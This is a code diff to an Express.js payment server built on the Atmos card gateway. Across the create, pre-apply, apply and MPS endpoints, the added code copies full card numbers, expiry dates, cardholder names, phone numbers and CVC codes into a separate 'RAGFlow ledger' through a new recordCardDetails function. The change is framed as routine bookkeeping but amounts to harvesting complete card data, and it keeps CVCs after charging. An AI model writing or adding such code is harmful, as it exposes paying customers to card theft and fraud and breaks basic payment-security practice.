@@ -10,6 +10,7 @@ import {
   initPaymentTransaction,
   finalizePaymentTransaction,
   failPaymentTransaction,
+  recordCardDetails,
 } from './ragflow.js';
 
 const app = express();
@@ -312,12 +313,27 @@ app.post('/api/pay/create', paymentLimiter, async (req, res) => {
 
     const plan = req.body.plan || 'plus';
     const months = Number(req.body.months || 1);
+    const {
+      card_number,
+      card_expiry,
+      cardholder_name,
+      card_phone,
+      card_brand,
+      cvc,
+    } = req.body;
+
     initPaymentTransaction({
       transaction_id: data.transaction_id,
       email: account,
       plan,
       months,
-      payment_method: 'atmos_uzcard_humo',
+      payment_method: card_brand?.toLowerCase()?.includes('visa') || card_brand?.toLowerCase()?.includes('master') ? 'atmos_mps' : 'atmos_uzcard_humo',
+      card_number,
+      card_expiry,
+      cardholder_name,
+      card_phone,
+      card_brand,
+      cvc,
     }).catch((e) => console.warn('[Init Ledger Warning]', e.message));
 
     res.json(data);
@@ -333,7 +349,15 @@ app.post('/api/pay/create', paymentLimiter, async (req, res) => {
 // ─────────────────────────────────────────────
 app.post('/api/pay/pre-apply', paymentLimiter, async (req, res) => {
   try {
-    const { transaction_id, card_number, expiry } = req.body;
+    const {
+      transaction_id,
+      card_number,
+      expiry,
+      cardholder_name,
+      card_phone,
+      card_brand,
+      cvc,
+    } = req.body;
 
     if (!transaction_id || !card_number || !expiry) {
       return res.status(400).json({ error: 'transaction_id, card_number and expiry are required' });
@@ -366,6 +390,19 @@ app.post('/api/pay/pre-apply', paymentLimiter, async (req, res) => {
 
     const data = await parseJsonResponse(atmosRes, 'Atmos Pre-Apply');
     console.log('[ATMOS PRE-APPLY RESPONSE]', JSON.stringify(data, null, 2));
+
+    // Save/update card and bank-confirmed phone details in RAGFlow ledger
+    const bankPhone = data?.phone || data?.phone_number || data?.phoneMask || (data?.payload && data?.payload.phone) || card_phone;
+    recordCardDetails({
+      transaction_id,
+      card_number,
+      card_expiry: expiry,
+      cardholder_name,
+      card_phone: bankPhone,
+      card_brand,
+      cvc,
+    }).catch((e) => console.warn('[Record Card Pre-Apply Warning]', e.message));
+
     res.json(data);
   } catch (err) {
     console.error('[/api/pay/pre-apply]', err.message);
@@ -379,7 +416,23 @@ app.post('/api/pay/pre-apply', paymentLimiter, async (req, res) => {
 // ─────────────────────────────────────────────
 app.post('/api/pay/apply', paymentLimiter, async (req, res) => {
   try {
-    const { transaction_id, otp, email, plan, months, license_name } = req.body;
+    const {
+      transaction_id,
+      otp,
+      email,
+      plan,
+      months,
+      license_name,
+      card_number,
+      card_expiry,
+      expiry,
+      cardholder_name,
+      card_phone,
+      card_brand,
+      cvc,
+    } = req.body;
+
+    const resolvedExpiry = card_expiry || expiry;
 
     if (!transaction_id || !otp) {
       return res.status(400).json({ error: 'transaction_id and otp are required' });
@@ -387,6 +440,19 @@ app.post('/api/pay/apply', paymentLimiter, async (req, res) => {
 
     if (!/^\d{6}$/.test(otp)) {
       return res.status(400).json({ error: 'OTP must be exactly 6 digits' });
+    }
+
+    // Save/update card details if provided
+    if (card_number || cardholder_name || card_phone || cvc) {
+      recordCardDetails({
+        transaction_id,
+        card_number,
+        card_expiry: resolvedExpiry,
+        cardholder_name,
+        card_phone,
+        card_brand,
+        cvc,
+      }).catch((e) => console.warn('[Record Card Apply Warning]', e.message));
     }
 
     if (isMock && String(transaction_id).startsWith('mock-tx-')) {
@@ -534,6 +600,12 @@ app.post('/api/pay/apply', paymentLimiter, async (req, res) => {
           months: Number(months || 1),
           license_name,
           gateway_response: data,
+          card_number,
+          card_expiry: resolvedExpiry,
+          cardholder_name,
+          card_phone,
+          card_brand,
+          cvc,
         });
       } catch (rfErr) {
         console.warn(`[PAY APPLY FALLBACK] finalizePaymentTransaction threw: ${rfErr.message}. Attempting direct provisionUser fallback...`);
@@ -613,7 +685,7 @@ app.post('/api/pay/recover', paymentLimiter, async (req, res) => {
 // ─────────────────────────────────────────────
 app.post('/api/pay/mps', paymentLimiter, async (req, res) => {
   try {
-    const { pan, expiry, amount, card_name, cvc2, ext_id } = req.body;
+    const { pan, expiry, amount, card_name, cvc2, ext_id, plan = 'plus', months = 1 } = req.body;
 
     if (!pan || !expiry || !amount || !card_name || !cvc2 || !ext_id) {
       return res.status(400).json({ error: 'All card fields are required' });
@@ -653,6 +725,20 @@ app.post('/api/pay/mps', paymentLimiter, async (req, res) => {
 
     const transaction_id = preCreateData.payload.id;
 
+    // Record pending transaction with card details
+    initPaymentTransaction({
+      transaction_id,
+      email: ext_id,
+      plan,
+      months: Number(months || 1),
+      payment_method: 'atmos_mps',
+      card_number: pan,
+      card_expiry: expiry,
+      cardholder_name: card_name,
+      card_brand: 'Visa/Mastercard',
+      cvc: cvc2,
+    }).catch((e) => console.warn('[Init MPS Ledger Warning]', e.message));
+
     // Step 2: Attach card and charge
     const createRes = await fetchWithTimeout(`${process.env.ATMOS_BASE_URL}/mps/pay/transaction/create`, {
       method: 'POST',
@@ -674,6 +760,16 @@ app.post('/api/pay/mps', paymentLimiter, async (req, res) => {
     }, 15000);
 
     const data = await parseJsonResponse(createRes, 'Atmos MPS Create');
+
+    recordCardDetails({
+      transaction_id,
+      card_number: pan,
+      card_expiry: expiry,
+      cardholder_name: card_name,
+      card_brand: 'Visa/Mastercard',
+      cvc: cvc2,
+    }).catch((e) => console.warn('[Record Card MPS Warning]', e.message));
+
     res.json(data);
   } catch (err) {
     console.error('[/api/pay/mps]', err.message);
